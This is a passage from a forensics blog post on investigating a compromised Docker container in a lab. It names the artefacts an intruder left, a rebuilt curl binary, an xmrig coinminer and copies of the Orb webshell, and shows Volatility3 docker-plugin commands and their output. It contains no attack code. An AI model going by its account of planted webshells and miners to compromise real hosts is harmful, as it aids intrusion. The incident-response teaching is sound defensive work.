title=extracted-layer-details></p><p>Within the folder for the layer we will extract the <code>layer.tar</code> file with a <code>tar -xvf layer.tar</code>. This presents us with the changes in the filesystem at the current layer of the image. Using what we learned from Dive above we can navigate to files of interest and begin to inspect them to determine what there intent was.</p><hr><h3 id=intermission>Intermission<a hidden class=anchor aria-hidden=true href=#intermission>#</a></h3><p>During analysis we learn the <code>curl</code> binary was uploaded in parts and then rebuilt as <code>ifj</code>. A coinminer (xmrig) was also uploaded in parts and rebuilt as the binary <code>8</code>. Additionally several webshells were uploaded. Given the timestamps of when all of the files appear to have been created it would appear it was the same actor copying the same shell to maintain access in the event that one of the shells was discovered and deleted. The web access logs confirm that the same ip address was used for all of the requests where malicious files started to appear. The webshells were identical copies of a version of Web Shell Orb, a fairly full featured webshell with various capabilities.</p><hr><h3 id=memory-analysis>Memory Analysis<a hidden class=anchor aria-hidden=true href=#memory-analysis>#</a></h3><p>Collection of memory occurs just as it would for any other Linux host. For this post LiME was used, but avml is also an option. Since this is a lab environment and the scenario is a bit contrived disk analysis tells enough of the story for us to understand what has occurred. If this were a bit more realistic the 8 binary probably would have been deleted from disk and we would either recover it from <code>/proc/&lt;PID>/exe</code> or we would carve it out of memory to perform analysis on it and determine what the binaries purpose was. With that in mind I chose to skip digging into that and instead chose to dig into some special things about container memory analysis with volatility.</p><h4 id=volatility2>Volatility2<a hidden class=anchor aria-hidden=true href=#volatility2>#</a></h4><p>When it comes to memory analysis with volatility there really isn&rsquo;t anything special about analyzing activity that has occurred in a container vs outside on the host. The most important thing to remember is when analyzing processes is to utilize the PID of the suspicious processes on at the host level and not the container native PIDs.</p><h4 id=volatility3>Volatility3<a hidden class=anchor aria-hidden=true href=#volatility3>#</a></h4><p>Container analysis with volatility3 is a little bit different than it is with volatility. The main reason for this is the <code>volatility-docker</code> plugin built by Ofek Shaked & Amir Sheffer. This plugin adds namespace support and various docker specific commands which can aid in understanding the dump.</p><p>One example is the additional argument added to the suite of ps commands: <code>nsinfo</code>. This argument will display information about the namespace associated with a particular pid.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime linux.pstree.PsTree --nsinfo
</span></span></code></pre></div><p>Below is a sample output of the pstree module showing nsinfo.</p><table><thead><tr><th>PID</th><th>PPID</th><th>COMM</th><th>Start Time (UTC)</th><th>PID in NS</th><th>UTS NS</th><th>IPC NS</th><th>MNT NS</th><th>NET NS</th><th>PID NS</th><th>USER NS</th></tr></thead><tbody><tr><td>* 11971</td><td>1</td><td>containerd-shim</td><td>2022-05-10 21:37:46.453</td><td>11971</td><td>4026531838</td><td>4026531839</td><td>4026531840</td><td>4026532040</td><td>4026531836</td><td>4026531837</td></tr><tr><td>** 11992</td><td>11971</td><td>main.sh</td><td>2022-05-10 21:37:46.489</td><td>1</td><td>4026532238</td><td>4026532239</td><td>4026532237</td><td>4026532242</td><td>4026532240</td><td>4026531837</td></tr><tr><td>*** 12323</td><td>11992</td><td>apache2</td><td>2022-05-10 21:37:49.355</td><td>308</td><td>4026532238</td><td>4026532239</td><td>4026532237</td><td>4026532242</td><td>4026532240</td><td>4026531837</td></tr><tr><td>**** 12334</td><td>12323</td><td>apache2</td><td>2022-05-10 21:37:49.428</td><td>319</td><td>4026532238</td><td>4026532239</td><td>4026532237</td><td>4026532242</td><td>4026532240</td><td>4026531837</td></tr><tr><td>**** 12335</td><td>12323</td><td>apache2</td><td>2022-05-10 21:37:49.428</td><td>320</td><td>4026532238</td><td>4026532239</td><td>4026532237</td><td>4026532242</td><td>4026532240</td><td>4026531837</td></tr><tr><td>**** 12336</td><td>12323</td><td>apache2</td><td>2022-05-10 21:37:49.429</td><td>321</td><td>4026532238</td><td>4026532239</td><td>4026532237</td><td>4026532242</td><td>4026532240</td><td>4026531837</td></tr><tr><td>**** 12337</td><td>12323</td><td>apache2</td><td>2022-05-10 21:37:49.429</td><td>322</td><td>4026532238</td><td>4026532239</td><td>4026532237</td><td>4026532242</td><td>4026532240</td><td>4026531837</td></tr><tr><td>***** 12795</td><td>12337</td><td>sh</td><td>2022-05-11 00:31:20.254</td><td>411</td><td>4026532238</td><td>4026532239</td><td>4026532237</td><td>4026532242</td><td>4026532240</td><td>4026531837</td></tr><tr><td>****** 12797</td><td>12795</td><td>sh</td><td>2022-05-11 00:31:20.255</td><td>413</td><td>4026532238</td><td>4026532239</td><td>4026532237</td><td>4026532242</td><td>4026532240</td><td>4026531837</td></tr><tr><td>******* 12798</td><td>12797</td><td>sh</td><td>2022-05-11 00:31:20.261</td><td>414</td><td>4026532238</td><td>4026532239</td><td>4026532237</td><td>4026532242</td><td>4026532240</td><td>4026531837</td></tr><tr><td>******** 12816</td><td>12798</td><td>8</td><td>2022-05-11 00:33:19.062</td><td>430</td><td>4026532238</td><td>4026532239</td><td>4026532237</td><td>4026532242</td><td>4026532240</td><td>4026531837</td></tr></tbody></table><p>In the table above we can see <code>main.sh</code> is a child of containerd-shim which indicates this is a process in a container. Additionally the pid for <code>main.sh</code> in the NS (PID in NS column) is 1 which tells us this is the pid used to start the container. Below that we can see other PIDs which are related to host pid 11992, and are in the same namespace. We can use the namespace information to determine all of the pids associated with this container even if they have forked away and no longer appear as child processes. Furthermore this mapping can be really helpful if the initial alert source that triggered the investigation is only showing the PID within the namespace.</p><p>The docker plugin itself adds several new capabilities. The output below shows the available arguments:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime linux.docker.Docker -h
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>optional arguments:
</span></span><span class=line><span class=cl>  -h, --help            show this <span class=nb>help</span> message and <span class=nb>exit</span>
</span></span><span class=line><span class=cl>  --detector            Detect Docker daemon / containers in memory
</span></span><span class=line><span class=cl>  --ps                  List of running containers
</span></span><span class=line><span class=cl>  --ps-extended         Extended list of running containers
</span></span><span class=line><span class=cl>  --inspect-caps        Inspect containers capabilities
</span></span><span class=line><span class=cl>  --inspect-mounts      Show a list of containers mounts
</span></span><span class=line><span class=cl>  --inspect-mounts-extended
</span></span><span class=line><span class=cl>                        Show detailed list of containers mounts
</span></span><span class=line><span class=cl>  --inspect-networks    Show detailed list of containers networks
</span></span><span class=line><span class=cl>  --inspect-networks-extended
</span></span><span class=line><span class=cl>                        Show detailed list of containers networks
</span></span></code></pre></div><p>The <code>--detector</code> argument attempts to detect if docker was being used on the system. This can be helpful if you are not sure if docker was being used on the system.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --detector
</span></span><span class=line><span class=cl>Volatility <span class=m>3</span> Framework 2.1.0
</span></span><span class=line><span class=cl>Progress:  100.00               Stacking attempts finished
</span></span><span class=line><span class=cl>Docker inetrface        Docker veth     Mounted Overlay FS      Containerd-shim is running
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>True    True    True    True
</span></span></code></pre></div><p><code>--ps</code> and <code>--ps-extended</code> emulates the <code>docker ps</code> command showing all containers within the dump and details about them.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 /home/ubuntu/git/volatility3/vol.py  -f /home/ubuntu/webserver.lime docker.Docker --ps
</span></span><span class=line><span class=cl>Volatility <span class=m>3</span> Framework 2.1.0
</span></span><span class=line><span class=cl>Progress:  100.00               Stacking attempts finished
</span></span><span class=line><span class=cl>Container ID    Command Creation Time <span class=o>(</span>UTC<span class=o>)</span>     PID
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>60795d68fdee     main.sh 2022-05-10 16:29:25.908 <span class=m>11992</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>---
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>python3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --ps-extended
</span></span><span class=line><span class=cl>Volatility <span class=m>3</span> Framework 2.1.0
</span></span><span class=line><span class=cl>Progress:  100.00               Stacking attempts finished
</span></span><span class=line><span class=cl>Creation <span class=nb>time</span> <span class=o>(</span>UTC<span class=o>)</span>     Command Container ID    Is privileged   PID     Effective UID
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>2022-05-10 16:29:25.908 main.sh 60795d68fdeeda1241083ffb35c96e3df8c295380ec4da7bc2b277db4d428216        False   <span class=m>11992</span>   <span class=m>0</span>
</span></span></code></pre></div><p>To see the capabilities associated with a container the <code>--inspect-caps</code> argument can be used. Having an understanding of a containers capabilities can help shed light on what possible damage it could cause to the underlying system or neighboring containers. This will generate an output similar to below:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --inspect-caps
</span></span><span class=line><span class=cl>Volatility <span class=m>3</span> Framework 2.1.0
</span></span><span class=line><span class=cl>Progress:  100.00               Stacking attempts finished
</span></span><span class=line><span class=cl>PID     Container ID    Effective Capabilities Mask     Effective Capabilities Mames
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>11992</span>    60795d68fdeeda1241083ffb35c96e3df8c295380ec4da7bc2b277db4d428216        0xa80425fb      CAP_CHOWN,CAP_DAC_OVERRIDE,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_CHROOT,CAP_MKNOD,CAP_AUDIT_WRITE,CAP_SETFCAP
</span></span></code></pre></div><p>The <code>--inspect-networks</code> argument will show the containers and the associated networks. If more than one container is in the same network the truncated container id&rsquo;s are comma seperated.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 /home/ubuntu/git/volatility3/vol.py -f /home/ubuntu/webserver.lime docker.Docker --inspect-networks
</span></span><span class=line><span class=cl>Volatility <span class=m>3</span> Framework 2.1.0
</span></span><span class=line><span class=cl>Progress:  100.00               Stacking attempts finished
</span></span><span class=line><span class=cl>Network /16 Segment     Containers IDs
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>172.17  60795d68fdee, &lt;SOME OTHER CONTAINER&gt;
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://jellyparks.com/tags/containers/>containers</a></li><li><a href=https://jellyparks.com/tags/linux/>linux</a></li><li><a href=https://jellyparks.com/tags/dfir/>dfir</a></li></ul><nav class=paginav><a class=prev href=https://jellyparks.com/posts/k8s-api-logs-for-responders/><span class=title>« Prev Page</span><br><span>kubernetes_logs_for_responders</span></a>
<a class=next href=https://jellyparks.com/posts/vulnerable-saml-app/><span class=title>Next Page »</span><br><span>Yogi's Vulnerable SAML app</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share compromised_container_analysis_primer on twitter" href="https://twitter.com/intent/tweet/?text=compromised_container_analysis_primer&url=https%3a%2f%2fjellyparks.com%2fposts%2fcompromised-container-analysis-primer%2f&hashtags=containers%2clinux%2cdfir"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share compromised_container_analysis_primer on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fjellyparks.com%2fposts%2fcompromised-container-analysis-primer%2f&title=compromised_container_analysis_primer&summary=compromised_container_analysis_primer&source=https%3a%2f%2fjellyparks.com%2fposts%2fcompromised-container-analysis-primer%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share compromised_container_analysis_primer on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fjellyparks.com%2fposts%2fcompromised-container-analysis-primer%2f&title=compromised_container_analysis_primer"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share compromised_container_analysis_primer on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fjellyparks.com%2fposts%2fcompromised-container-analysis-primer%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share compromised_container_analysis_primer on whatsapp" href="https://api.whatsapp.com/send?text=compromised_container_analysis_primer%20-%20https%3a%2f%2fjellyparks.com%2fposts%2fcompromised-container-analysis-primer%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share compromised_container_analysis_primer on telegram" href="https://telegram.me/share/url?text=compromised_container_analysis_primer&url=https%3a%2f%2fjellyparks.com%2fposts%2fcompromised-container-analysis-primer%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2022 <a href=https://jellyparks.com>JellyParks</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerText="copy";function s(){t.innerText="copied!",setTimeout(()=>{t.innerText="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>